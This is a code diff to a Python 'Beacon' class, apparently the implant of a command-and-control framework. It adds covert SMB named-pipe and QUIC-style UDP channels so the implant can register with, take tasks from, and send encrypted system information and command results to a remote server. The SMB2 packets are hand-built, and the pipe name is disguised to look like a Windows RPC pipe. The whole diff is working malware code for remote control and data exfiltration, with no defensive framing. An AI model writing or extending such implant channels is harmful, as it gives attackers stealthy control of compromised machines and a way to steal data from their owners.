@@ -875,6 +875,8 @@ class Beacon:
 
         https_cfg = c2.get("https", {})
         dns_cfg = c2.get("dns", {})
+        smb_cfg = c2.get("smb", {})
+        quic_cfg = c2.get("quic", {})
 
         self.https_enabled = https_cfg.get("enabled", False)
         self.callback_url = https_cfg.get("callback_url", "")
@@ -883,6 +885,13 @@ class Beacon:
         self.dns_enabled = dns_cfg.get("enabled", False)
         self.dns_domain = dns_cfg.get("domain", "")
         self.dns_resolver = dns_cfg.get("resolver", "8.8.8.8")
+
+        self.smb_enabled = smb_cfg.get("enabled", False)
+        self.smb_pipe_name = smb_cfg.get("pipe_name", "msrpc_6e2f")
+        self.smb_server = smb_cfg.get("server", "")
+
+        self.quic_enabled = quic_cfg.get("enabled", False)
+        self.quic_server = quic_cfg.get("server", "")
 
         enc_key = c2.get("encryption_key", "")
         if enc_key:
@@ -1183,6 +1192,365 @@ class Beacon:
         except Exception as e:
             logger.debug("DNS beacon failed: %s", e)
         return None
+
+    # ── SMB named-pipe transport ──
+
+    def _smb_connect(self) -> Optional[socket.socket]:
+        """Connect to SMB server and open a named pipe for C2 comms."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(15)
+            host = self.smb_server
+            port = 445
+            if ":" in host:
+                host, port = host.rsplit(":", 1)
+                port = int(port)
+            sock.connect((host, port))
+
+            # SMB2 Negotiate
+            neg = self._smb2_negotiate()
+            sock.sendall(self._smb_netbios_wrap(neg))
+            resp = self._smb_recv(sock)
+            if not resp or resp[12:14] != b"\x00\x00":
+                sock.close()
+                return None
+
+            # SMB2 Session Setup (anonymous/null)
+            sess = self._smb2_session_setup()
+            sock.sendall(self._smb_netbios_wrap(sess))
+            resp = self._smb_recv(sock)
+            if not resp:
+                sock.close()
+                return None
+            self._smb_session_id = resp[44:52]
+
+            # SMB2 Tree Connect to IPC$
+            tree = self._smb2_tree_connect(host)
+            sock.sendall(self._smb_netbios_wrap(tree))
+            resp = self._smb_recv(sock)
+            if not resp:
+                sock.close()
+                return None
+            self._smb_tree_id = resp[40:44]
+
+            # SMB2 Create (open named pipe)
+            create = self._smb2_create_pipe(self.smb_pipe_name)
+            sock.sendall(self._smb_netbios_wrap(create))
+            resp = self._smb_recv(sock)
+            if not resp or len(resp) < 84:
+                sock.close()
+                return None
+            self._smb_file_id = resp[132:148]
+
+            return sock
+        except Exception as e:
+            logger.debug("SMB connect failed: %s", e)
+            return None
+
+    def _smb_netbios_wrap(self, data: bytes) -> bytes:
+        return b"\x00" + struct.pack(">I", len(data))[1:] + data
+
+    def _smb_recv(self, sock: socket.socket) -> Optional[bytes]:
+        try:
+            hdr = b""
+            while len(hdr) < 4:
+                chunk = sock.recv(4 - len(hdr))
+                if not chunk:
+                    return None
+                hdr += chunk
+            length = struct.unpack(">I", b"\x00" + hdr[1:4])[0]
+            data = b""
+            while len(data) < length:
+                chunk = sock.recv(min(length - len(data), 65536))
+                if not chunk:
+                    return None
+                data += chunk
+            return data
+        except Exception:
+            return None
+
+    def _smb2_negotiate(self) -> bytes:
+        hdr = b"\xfeSMB"
+        hdr += struct.pack("<H", 64)         # StructureSize
+        hdr += struct.pack("<H", 0)          # CreditCharge
+        hdr += struct.pack("<I", 0)          # Status
+        hdr += struct.pack("<H", 0)          # Command: NEGOTIATE
+        hdr += struct.pack("<H", 1)          # CreditRequest
+        hdr += struct.pack("<I", 0)          # Flags
+        hdr += struct.pack("<I", 0)          # NextCommand
+        hdr += struct.pack("<Q", 1)          # MessageId
+        hdr += struct.pack("<I", 0)          # Reserved
+        hdr += struct.pack("<I", 0)          # TreeId
+        hdr += struct.pack("<Q", 0)          # SessionId
+        hdr += b"\x00" * 16                  # Signature
+        # Negotiate body
+        body = struct.pack("<H", 36)         # StructureSize
+        body += struct.pack("<H", 2)         # DialectCount
+        body += struct.pack("<H", 1)         # SecurityMode
+        body += struct.pack("<H", 0)         # Reserved
+        body += struct.pack("<I", 0)         # Capabilities
+        body += b"\x00" * 16                 # ClientGuid
+        body += struct.pack("<I", 0)         # NegotiateContextOffset
+        body += struct.pack("<H", 0)         # NegotiateContextCount
+        body += struct.pack("<H", 0)         # Reserved2
+        body += struct.pack("<H", 0x0202)    # Dialect SMB 2.0.2
+        body += struct.pack("<H", 0x0210)    # Dialect SMB 2.1
+        return hdr + body
+
+    def _smb2_session_setup(self) -> bytes:
+        hdr = self._smb2_header(1, 0)       # Command: SESSION_SETUP
+        # NTLMSSP Negotiate (Type 1) — anonymous
+        ntlm = b"NTLMSSP\x00"
+        ntlm += struct.pack("<I", 1)        # Type 1
+        ntlm += struct.pack("<I", 0xe2088297)  # Flags
+        ntlm += b"\x00" * 16                # DomainNameFields + WorkstationFields
+        body = struct.pack("<H", 25)         # StructureSize
+        body += struct.pack("<B", 0)         # Flags
+        body += struct.pack("<B", 1)         # SecurityMode
+        body += struct.pack("<I", 0)         # Capabilities
+        body += struct.pack("<I", 0)         # Channel
+        body += struct.pack("<H", 88)        # SecurityBufferOffset
+        body += struct.pack("<H", len(ntlm)) # SecurityBufferLength
+        body += struct.pack("<Q", 0)         # PreviousSessionId
+        body += ntlm
+        return hdr + body
+
+    def _smb2_tree_connect(self, host: str) -> bytes:
+        hdr = self._smb2_header(3, 0)       # Command: TREE_CONNECT
+        path = f"\\\\{host}\\IPC$".encode("utf-16-le")
+        body = struct.pack("<H", 9)          # StructureSize
+        body += struct.pack("<H", 0)         # Reserved
+        body += struct.pack("<H", 72)        # PathOffset (from start of header)
+        body += struct.pack("<H", len(path)) # PathLength
+        body += path
+        return hdr + body
+
+    def _smb2_create_pipe(self, pipe_name: str) -> bytes:
+        hdr = self._smb2_header(5, 0)       # Command: CREATE
+        name = pipe_name.encode("utf-16-le")
+        body = struct.pack("<H", 57)         # StructureSize
+        body += struct.pack("<B", 0)         # SecurityFlags
+        body += struct.pack("<B", 2)         # RequestedOplockLevel
+        body += struct.pack("<I", 0)         # ImpersonationLevel
+        body += struct.pack("<Q", 0)         # SmbCreateFlags
+        body += struct.pack("<Q", 0)         # Reserved
+        body += struct.pack("<I", 0x001f01ff)  # DesiredAccess: GENERIC_ALL
+        body += struct.pack("<I", 7)         # FileAttributes
+        body += struct.pack("<I", 7)         # ShareAccess: READ|WRITE|DELETE
+        body += struct.pack("<I", 1)         # CreateDisposition: FILE_OPEN
+        body += struct.pack("<I", 0)         # CreateOptions
+        body += struct.pack("<H", 120)       # NameOffset
+        body += struct.pack("<H", len(name)) # NameLength
+        body += struct.pack("<I", 0)         # CreateContextsOffset
+        body += struct.pack("<I", 0)         # CreateContextsLength
+        body += name
+        return hdr + body
+
+    def _smb2_header(self, command: int, tree_id_val: int) -> bytes:
+        hdr = b"\xfeSMB"
+        hdr += struct.pack("<H", 64)
+        hdr += struct.pack("<H", 0)          # CreditCharge
+        hdr += struct.pack("<I", 0)          # Status
+        hdr += struct.pack("<H", command)
+        hdr += struct.pack("<H", 1)          # CreditRequest
+        hdr += struct.pack("<I", 0)          # Flags
+        hdr += struct.pack("<I", 0)          # NextCommand
+        hdr += struct.pack("<Q", 2)          # MessageId
+        hdr += struct.pack("<I", 0)          # Reserved
+        hdr += getattr(self, "_smb_tree_id", struct.pack("<I", tree_id_val))
+        hdr += getattr(self, "_smb_session_id", struct.pack("<Q", 0))
+        hdr += b"\x00" * 16                  # Signature
+        return hdr
+
+    def _smb_write_pipe(self, sock: socket.socket, data: bytes) -> bool:
+        try:
+            hdr = self._smb2_header(9, 0)    # Command: WRITE
+            body = struct.pack("<H", 49)     # StructureSize
+            body += struct.pack("<H", 70)    # DataOffset
+            body += struct.pack("<I", len(data))  # Length
+            body += struct.pack("<Q", 0)     # Offset
+            body += self._smb_file_id        # FileId (16 bytes)
+            body += struct.pack("<I", 0)     # Channel
+            body += struct.pack("<I", 0)     # RemainingBytes
+            body += struct.pack("<H", 0)     # WriteChannelInfoOffset
+            body += struct.pack("<H", 0)     # WriteChannelInfoLength
+            body += struct.pack("<I", 0)     # Flags
+            body += data
+            sock.sendall(self._smb_netbios_wrap(hdr + body))
+            resp = self._smb_recv(sock)
+            return resp is not None
+        except Exception:
+            return False
+
+    def _smb_read_pipe(self, sock: socket.socket) -> Optional[bytes]:
+        try:
+            hdr = self._smb2_header(8, 0)    # Command: READ
+            body = struct.pack("<H", 49)     # StructureSize
+            body += struct.pack("<B", 0)     # Padding
+            body += struct.pack("<B", 0)     # Flags
+            body += struct.pack("<I", 65536) # Length
+            body += struct.pack("<Q", 0)     # Offset
+            body += self._smb_file_id        # FileId (16 bytes)
+            body += struct.pack("<I", 1)     # MinimumCount
+            body += struct.pack("<I", 0)     # Channel
+            body += struct.pack("<I", 0)     # RemainingBytes
+            body += struct.pack("<H", 0)     # ReadChannelInfoOffset
+            body += struct.pack("<H", 0)     # ReadChannelInfoLength
+            body += b"\x00"                  # Buffer
+            sock.sendall(self._smb_netbios_wrap(hdr + body))
+            resp = self._smb_recv(sock)
+            if not resp or len(resp) < 84:
+                return None
+            data_offset = struct.unpack_from("<H", resp, 66)[0] - 64
+            data_length = struct.unpack_from("<I", resp, 68)[0]
+            return resp[64 + data_offset:64 + data_offset + data_length]
+        except Exception:
+            return None
+
+    def _beacon_smb(self) -> Optional[dict]:
+        """Exchange C2 data over SMB named pipe."""
+        sock = self._smb_connect()
+        if not sock:
+            return None
+        try:
+            agent = self._agent_id or self._implant_id
+            payload = self._encrypt(json.dumps({
+                "action": "beacon" if self._registered else "register",
+                "agent_id": agent,
+                **self._system_info(),
+            }).encode())
+            if not self._smb_write_pipe(sock, payload.encode() if isinstance(payload, str) else payload):
+                return None
+            resp_data = self._smb_read_pipe(sock)
+            if not resp_data:
+                return None
+            try:
+                return self._decrypt(resp_data.decode() if isinstance(resp_data, bytes) else resp_data)
+            except Exception:
+                return json.loads(resp_data)
+        except Exception as e:
+            logger.debug("SMB beacon failed: %s", e)
+            return None
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+    def _send_result_smb(self, task_id: str, status: str, output: str,
+                         data: Optional[dict] = None):
+        sock = self._smb_connect()
+        if not sock:
+            return
+        try:
+            result = {
+                "action": "result",
+                "agent_id": self._agent_id or self._implant_id,
+                "task_id": task_id,
+                "status": status,
+                "output": output,
+            }
+            if data:
+                result["data"] = data
+            payload = self._encrypt(json.dumps(result).encode())
+            self._smb_write_pipe(sock, payload.encode() if isinstance(payload, str) else payload)
+            self._smb_read_pipe(sock)
+        except Exception as e:
+            logger.debug("SMB result send failed: %s", e)
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+    # ── QUIC (UDP) transport ──
+
+    def _quic_send(self, data: dict) -> Optional[dict]:
+        """Lightweight QUIC-like C2 channel over UDP with TLS-style framing."""
+        try:
+            host = self.quic_server
+            port = 4433
+            if ":" in host:
+                host, port = host.rsplit(":", 1)
+                port = int(port)
+
+            payload = self._encrypt(json.dumps(data).encode())
+            if isinstance(payload, str):
+                payload = payload.encode()
+
+            # Frame: [4-byte length][payload]
+            frame = struct.pack(">I", len(payload)) + payload
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(10)
+
+            # Fragment into 1200-byte QUIC-style datagrams
+            frag_size = 1200
+            total_frags = (len(frame) + frag_size - 1) // frag_size
+            stream_id = struct.unpack(">I", os.urandom(4))[0]
+
+            for i in range(total_frags):
+                chunk = frame[i * frag_size:(i + 1) * frag_size]
+                # Header: [stream_id(4)][frag_index(2)][total_frags(2)][chunk]
+                dgram = struct.pack(">IHH", stream_id, i, total_frags) + chunk
+                sock.sendto(dgram, (host, port))
+
+            # Receive reassembled response
+            fragments: dict = {}
+            expected = None
+            while True:
+                try:
+                    resp_data, _ = sock.recvfrom(1500)
+                    if len(resp_data) < 8:
+                        continue
+                    r_stream, r_idx, r_total = struct.unpack(">IHH", resp_data[:8])
+                    expected = r_total
+                    fragments[r_idx] = resp_data[8:]
+                    if len(fragments) == expected:
+                        break
+                except socket.timeout:
+                    break
+
+            sock.close()
+
+            if not fragments or (expected and len(fragments) < expected):
+                return None
+
+            reassembled = b""
+            for i in sorted(fragments.keys()):
+                reassembled += fragments[i]
+
+            resp_len = struct.unpack(">I", reassembled[:4])[0]
+            resp_payload = reassembled[4:4 + resp_len]
+
+            try:
+                return self._decrypt(resp_payload.decode())
+            except Exception:
+                return json.loads(resp_payload)
+        except Exception as e:
+            logger.debug("QUIC beacon failed: %s", e)
+            return None
+
+    def _beacon_quic(self) -> Optional[dict]:
+        agent = self._agent_id or self._implant_id
+        return self._quic_send({
+            "action": "beacon" if self._registered else "register",
+            "agent_id": agent,
+            **self._system_info(),
+        })
+
+    def _send_result_quic(self, task_id: str, status: str, output: str,
+                          data: Optional[dict] = None):
+        result = {
+            "action": "result",
+            "agent_id": self._agent_id or self._implant_id,
+            "task_id": task_id,
+            "status": status,
+            "output": output,
+        }
+        if data:
+            result["data"] = data
+        self._quic_send(result)
 
     # ── Command execution (pure Python for file ops, subprocess only for shell) ──
 
@@ -3152,8 +3520,26 @@ class Beacon:
             status = "error"
             output = f"[exception: {e}]"
 
-        if task_id and self.https_enabled:
-            self._send_result_https(task_id, status, output, result_data)
+        if task_id:
+            sent = False
+            if self.https_enabled and not sent:
+                try:
+                    self._send_result_https(task_id, status, output, result_data)
+                    sent = True
+                except Exception:
+                    pass
+            if self.smb_enabled and not sent:
+                try:
+                    self._send_result_smb(task_id, status, output, result_data)
+                    sent = True
+                except Exception:
+                    pass
+            if self.quic_enabled and not sent:
+                try:
+                    self._send_result_quic(task_id, status, output, result_data)
+                    sent = True
+                except Exception:
+                    pass
 
     # ── Main loop ──
 
@@ -3184,6 +3570,16 @@ class Beacon:
 
             if tasking is None and self.dns_enabled:
                 tasking = self._beacon_dns()
+
+            if tasking is None and self.smb_enabled:
+                tasking = self._beacon_smb()
+                if tasking and tasking.get("success"):
+                    self._registered = True
+
+            if tasking is None and self.quic_enabled:
+                tasking = self._beacon_quic()
+                if tasking and tasking.get("success"):
+                    self._registered = True
 
             if tasking is None:
                 self._consecutive_failures += 1
